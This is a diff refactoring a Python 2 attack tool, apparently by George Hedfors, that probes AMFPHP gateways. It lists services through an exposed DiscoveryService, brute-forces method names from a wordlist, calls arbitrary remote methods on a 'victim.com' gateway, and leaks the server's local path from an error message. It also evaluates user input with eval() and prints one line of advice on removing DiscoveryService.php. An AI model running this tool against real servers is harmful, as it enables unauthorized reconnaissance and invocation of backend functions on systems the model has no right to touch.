@@ -19,286 +19,270 @@ sys.path.append("pyamf/")
 from pyamf.flex import ArrayCollection
 from pyamf.remoting.client import RemotingService
 
-currentClass = 'amfphp.DiscoveryService'
-debug = 0
+class _cmdList(cmd.Cmd):
+    intro = "Welcome to Action Message Formate Shell by George Hedfors. Type 'help' for command list.\n"
 
-class cmdList(cmd.Cmd):
-	intro = "Welcome to Action Message Formate Shell by George Hedfors. Type 'help' for command list.\n"
+    def do_help(self, line):
+        print "Available commands:"
+        print "-----------------------"
+        print "brute\t\t\t\tLaunch a method name brute force attack using"
+        print "\t\t\t\tcommon names from common.txt"
+        print "call methodName(args,..)\tCall a method from the current class. Arguments"
+        print "\t\t\t\tmay be single arguments or arrays:"
+        print "call methodName(['array','of','stuff'])"
+        print "call methodName(arg1,arg2,arg3)"
+        print "describe\t\t\tDescribe current class. Lists methods and args."
+        print "describe_all\t\t\tLists methods and arguments from all classes"
+        print "\t\t\t\tto output file."
+        print "help\t\t\t\tWhere all the secrets are..."
+        print "list\t\t\t\tLists available classes"
+        print "use service.className\t\tChange current class"
+        print
 
-	def do_help(self, line):
-		print "Available commands:"
-		print "-----------------------"
-		print "brute\t\t\t\tLaunch a method name brute force attack using"
-		print "\t\t\t\tcommon names from common.txt"
-		print "call methodName(args,..)\tCall a method from the current class. Arguments"
-		print "\t\t\t\tmay be single arguments or arrays:"
-		print "call methodName(['array','of','stuff'])"
-		print "call methodName(arg1,arg2,arg3)"
-		print "describe\t\t\tDescribe current class. Lists methods and args."
-		print "describe_all\t\t\tLists methods and arguments from all classes"
-		print "\t\t\t\tto output file."
-		print "help\t\t\t\tWhere all the secrets are..."
-		print "list\t\t\t\tLists available classes"
-		print "use service.className\t\tChange current class"
-		print
+    def do_describe_all(self, line):
+        output = "%s.txt" % sys.argv[1].split("/")[2]
+        fp = open(output, "w")
 
-	def do_describe_all(self, line):
-		output = "%s.txt" % sys.argv[1].split("/")[2]
-		fp = open(output, "w")
+        i = 0
+        e = 0
 
-		i = 0
-		e = 0
+        for item in self.amf.services:
+            fp.write("%s\n" % item)
+            result = self.amf.getMethods(item)
 
-		for item in serviceList:
-			root = item['label']
+            if not hasattr(result, 'code'):
+                if type(result[0]) is ListType:
+                    fp.write("\tIs accessible but did not return any usable methods.\n")
+                else:
+                    for key in result[0].keys():
+                        fp.write("\t%s(%s)\n" % (key, ", ".join(result[0][key]['arguments'])))
+                        if result[0][key]['description'].find("No description") == -1: fp.write("\t- %s\n" % result[0][key]['description'])
 
-			if item.has_key('children'):
-				for child in item['children']:
-					myClass = child['label']
-					myService = "%s.%s" % (root, myClass)
+                        i += 1
+                    else:
+                        e += 1
 
-					fp.write("%s\n" % myService)
+        fp.close()
 
-					result = describeService(myService)
+        print "Exported %d classes and methods to '%s'" % (i, output)
+        print "%d error(s) cought" % e
 
-					if result != -1:
-						if type(result[0]) is ListType:
-							fp.write("\tIs accessible but did not return any usable methods.\n")
-						else:
-							for key in result[0].keys():
-								fp.write("\t%s(%s)\n" % (key, ", ".join(result[0][key]['arguments'])))
-								if result[0][key]['description'].find("No description") == -1: fp.write("\t- %s\n" % result[0][key]['description'])
+    def do_describe(self, line):
+        if self.amf.hasDiscoveryService:
+            result = self.amf.getMethods(self.amf.dstClass)
 
-						i += 1
-					else:
-						e += 1
-			else:
-				result = describeService(item['label'])
-				fp.write("%s\n" % item['label'])
+            print result[1]
+            print "---------------"
 
-				if result != -1:
-					if type(result[0]) is ListType:
-						fp.write("\tIs accessible but did not return any usable methods.\n")
-					else:
-						for key in result[0].keys():
-							fp.write("\t%s(%s)\n" % (key, ", ".join(result[0][key]['arguments'])))
-							if result[0][key]['description'].find("No description") == -1: fp.write("\t- %s\n" % result[0][key]['description'])
+            if hasattr(result, 'code'):
+                _printErr(result)
+            else:
+                if type(result[0]) is ListType:
+                    for item in result[0]:
+                        print item
+                else:
+                    for key in result[0].keys():
+                        print "%s(%s) - %s" % (key, ", ".join(result[0][key]['arguments']), result[0][key]['description'])
+        else:
+            print "[+] ERROR: DiscoveryService does not exist, consider trying 'brute'"
 
-					i += 1
-				else:
-					e += 1
-			
-		fp.close()
+    def do_brute(self, line):
+        if self.amf.dstClass == "/":
+            print "[+] ERROR: You cannot launch a brute force without a valid class."
+            return
 
-		print "Exported %d classes and methods to '%s'" % (i, output)
-		print "%d error(s) cought" % e
+        if self.amf.hasDiscoveryService:
+            print "[+] INFO: This is not necessary as DiscoveryService exists. Use 'list' and 'describe' instead."
 
-	def do_describe(self, line):
-		result = describeService(self.currentClass)
+        yesno = raw_input('This may seriously harm your environment, are you sure? (y/N): ')
 
-		printDebug(result)
+        if yesno == 'y' or yesno == 'Y':
+            file = open("common.txt", "r")
+            lines = file.readlines()
+            file.close()
 
-		if result == -1:
-			return
+            print "Testing", len(lines), "methods..."
 
-		print result[1]
-		print "---------------"
+            for method in lines:
+                result = self.amf.execute("%s()" % method.rstrip())
 
-		if hasattr(result, 'code'):
-			printErr(result)
-		else:
-			if type(result[0]) is ListType:
-				for item in result[0]:
-					print item
-			else:
-				for key in result[0].keys():
-					print "%s(%s) - %s" % (key, ", ".join(result[0][key]['arguments']), result[0][key]['description'])
+                if result:
+                    if hasattr(result, 'code'):
+                        if result.code != 'AMFPHP_INEXISTANT_METHOD':
+                            _printErr(result)
+                    else:
+                        if type(result) is BooleanType:
+                            print "%s() returned: %s" % (method.rstrip(), result)
+                        else:
+                            print "%s() returned %d items" % (method.rstrip(), len(result))
+                else:
+                    print self.amf.err
 
-	def do_brute(self, line):
-		yesno = raw_input('This may seriously harm your environment, are you sure? (y/N): ')
+    def do_list(self, line):
+        if self.amf.hasDiscoveryService:
+            print "\n".join(self.amf.services)
+        else:
+            print "[+] ERROR: DiscoveryService wasn't present"
 
-		if yesno == 'y' or yesno == 'Y':
-			file = open("common.txt", "r")
-			lines = file.readlines()
-			file.close()
+    def do_use(self, line):
+        if line == '':
+            print "syntax: use className\n"
+            return 
 
-			client = RemotingService(remoteUrl)
-			service = client.getService(self.currentClass)
+        if self.amf.hasClass(line):
+            self.amf.dstClass = line
+            self.prompt = "(%s) " % (line)
+        else:
+            _printErr(self.amf.err)
 
-			print "Testing", len(lines), "methods..."
+    def do_call(self, line):
+        result = self.amf.execute(line)
 
-			for method in lines:
-				testMethod = getattr(service, method.rstrip())
-				
-				try:
-					result = testMethod()
+        if hasattr(result, 'code'):
+            _printErr(result)
+        else:
+            print result
 
-					if hasattr(result, 'code'):
-						if result.code != 'AMFPHP_INEXISTANT_METHOD':
-							printErr(result)
-					else:
-						if type(result) is BooleanType:
-							print "%s() returned: %s" % (method.rstrip(), result)
-						else:
-							print "%s() returned %d items" % (method.rstrip(), len(result))
-				except Exception, e:
-					print "%s(): %s" % (method.rstrip(), e)
-					pass
+    def do_exit(self, line):
+        return True
 
-	def do_list(self, line):
-		for item in serviceList:
-			printDebug(item)
+    def do_EOF(self, line):
+        return True
 
-			myClass = item['label']
-			if item.has_key('children'):
-				for child in item['children']:
-					myMethod = child['label']
-					print "%s.%s" % (myClass, myMethod)
-			else:
-				print item['label']
 
-	def do_use(self, line):
-		if line == '':
-			print "syntax: use className\n"
-			return 
+class AMFShell(RemotingService):
+    def __init__(self, url):
+        RemotingService.__init__(self, url)
 
-		client = RemotingService(remoteUrl)
-		service = client.getService(line)
+        self.dstClass = "amfphp/DiscoveryService"
 
-		try:
-			result = service.nosuchmethod()
-		except Exception, e:
-			print e
-			return
-		
-		printDebug(result)
+        self._discoveryService = self._getService(self.dstClass)
 
-		if result.code != 'AMFPHP_INEXISTANT_METHOD':
-			printErr(result)
-		else:
-			self.currentClass = line
-			cmdList.prompt = "(%s) " % (line)
+        try:
+            services = self._discoveryService.getServices()
+        except Exception, e:
+            print e
+            sys.exit(1)
 
-	def do_call(self, line):
-		if line.find('(') == -1:
-			print "syntax: call methodName(arg, ..)\n"
-			return
+        if hasattr(services, 'code'):
+            if services.code == 'AMFPHP_FILE_NOT_FOUND' or services.code == 'AMFPHP_CLASSPATH_NOT_FOUND':
+                self.services = None
+                self.hasDiscoveryService = False
+                self.dstClass = '/'
+                return
+            else:
+                print services
+                raise
+        else:
+            self.hasDiscoveryService = True 
 
-		myMethod = line.split('(')[0]
+        self.services = list()
 
-		client = RemotingService(remoteUrl)
-		service = client.getService(self.currentClass)
-		targetMethod = getattr(service, myMethod)
+        for service in services:
+            if service.has_key('children'):
+                for child in service['children']:
+                    self.services.append("%s%s" % (child['data'], child['label']))
+            else:
+                self.services.append(service['label'])
 
-		args = line.split('(')[1].split(')')[0]
+    def _getService(self, service):
+        return self.getService(service.replace('/', '.'))
 
-		try:
-			if len(args) > 0:
-				if args.find('[') != -1:
-					result = targetMethod(eval(args))
-				else:
-					result = targetMethod(*args.split(','))
-			else:
-				result = targetMethod()
-		except Exception, e:
-			print e
-			return
+    def getMethods(self, service):
+        """returns available methods, arguments and descriptions as list()."""
 
-		printDebug(result)
+        if self.hasDiscoveryService:
+            self._discoveryService = self._getService("amfphp.DiscoveryService")
+        
+            try:
+                methods = self._discoveryService.describeService({'data': '', 'label': service})
+            except Exception, e:
+                return None
 
-		if hasattr(result, 'code'):
-			printErr(result)
-		else:
-			#printTree(result)
-			dir(result)
-			print result
+            return methods
+        else:
+            return None
 
-	def do_exit(self, line):
-		return True
+    def execute(self, dst):
+        """executes method(args, ..) and returns result"""
+        
+        if dst.find('(') == -1:
+            return None
 
-	def do_EOF(self, line):
-		return True
+        method = dst.split('(')[0]
+        args = dst.split('(')[1].split(')')[0]
 
-def describeService(myService):
-		client = RemotingService(remoteUrl)
-		service = client.getService('amfphp.DiscoveryService')
+        service = self._getService(self.dstClass)
+        targetMethod = getattr(service, method)
 
-		toDescribe = {'data':'', 'label':"/".join(myService.split("."))}
+        try:
+            if len(args) > 0:
+                if args.find('[') != -1:
+                    result = targetMethod(eval(args))
+                else:
+                    result = targetMethod(args.split(','))
+            else:
+                result = targetMethod()
+        except Exception, e:
+            self.err = e
+            return None
 
-		try:
-			result = service.describeService(toDescribe)
-		except Exception, e:
-			print e
-			return -1
+        return result
 
-		if hasattr(result, 'code'):
-			printErr(result)
-			return -1
+    def hasClass(self, dstClass):
+        """returns if dstClass is usable."""
 
-		return result
+        service = self._getService(dstClass)
+        result = service.nosuchmethod()
 
-def printErr(result):
-	print result.description
+        if hasattr(result, 'code'):
+            if result.code == 'AMFPHP_FILE_NOT_FOUND':
+                self.err = result
+                return False
+            elif result.code == 'AMFPHP_INEXISTANT_METHOD':
+                return True
+            else:
+                print result
+                raise
+        else:
+            print result
+            raise
 
-def printTree(stack):
-	if hasattr(stack, 'keys'):
-		for key in stack.keys():
-			if type(stack[key]) is UnicodeType:
-				print key, "|", stack[key]
-			else:
-				printTree(stack[key])
-	elif type(stack) is ListType:
-		if len(stack) == 1:
-			printTree(stack[0])
-		else:
-			for item in range(len(stack)):
-				printTree(item)
-	else:
-		print stack
+def _printErr(result):
+    print result.description
 
-def printDebug(result):
-	if debug > 0: print "[+] DEBUG:", result
-	return
+def _getLocalPath(client):
+    service = client.getService("nofile")
+    dumb = service.nosuchservice()
 
-def getLocalPath(client):
-	service = client.getService("nofile")
-	dumb = service.nosuchservice()
-	try:
-		lpath = dumb.description.split('{')[2].split('}')[0].split('/')
-		lpath.pop()
-		localPath = "/".join(lpath)
-	except:
-		return False
+    try:
+        lpath = dumb.description.split('{')[2].split('}')[0].split('/')
+        lpath.pop()
+        localPath = "/".join(lpath)
+    except:
+        return False
 
-	return localPath
+    return localPath
 
 if __name__ == '__main__':
-	if len(sys.argv) < 2:
-		print "syntax: %s http://victim.com/amfphp/gateway.php\n" % sys.argv[0]
-		sys.exit(1)
+    if len(sys.argv) < 2:
+        print "syntax: %s http://victim.com/amfphp/gateway.php\n" % sys.argv[0]
+        sys.exit(1)
 
-	remoteUrl = sys.argv[1]
+    remoteUrl = sys.argv[1]
 
-	try:
-		cmdList.client = RemotingService(remoteUrl)
-		localPath = getLocalPath(cmdList.client)
-	except Exception, e:
-		print e
-		sys.exit()
+    try:
+        _cmdList.amf = AMFShell(remoteUrl)
+        localPath = _getLocalPath(_cmdList.amf)
+    except Exception, e:
+        print e
+        sys.exit()
 
-	cmdList.service = cmdList.client.getService(currentClass)
+    if _cmdList.amf.hasDiscoveryService:
+        print "[+] AMFPHP exists and appears to be vulnerable to 'DiscoveryService'."
+        print "[*] To disable 'DiscoveryServices', remove %s/amfphp/DiscoveryService.php\n" % localPath
+    else:
+        print "[+] AMFPHP exists but appears not to be vulnerable to 'DiscoveryService'. Listing services will not work.\n"
 
-	serviceList = cmdList.service.getServices()
-
-
-	if hasattr(serviceList, 'code'):
-		if result.code == 'AMFPHP_INEXISTANT_METHOD':
-			print "[+] AMFPHP exists but appears not to be vulnerable to 'DiscoveryServices'. Listing services will not work.\n"
-	else:
-		print "[+] AMFPHP exists and appears to be vulnerable to 'DiscoveryService'."
-		print "[*] To disable 'DiscoveryServices', remove %s/amfphp/DiscoveryService.php\n" % localPath
-
-	cmdList.prompt = "(%s) " % (currentClass)
-	cmdList.currentClass = currentClass
-	cmdList.localPath = localPath
-	cmdList().cmdloop()
+    _cmdList.prompt = "(%s) " % (_cmdList.amf.dstClass)
+    _cmdList().cmdloop()
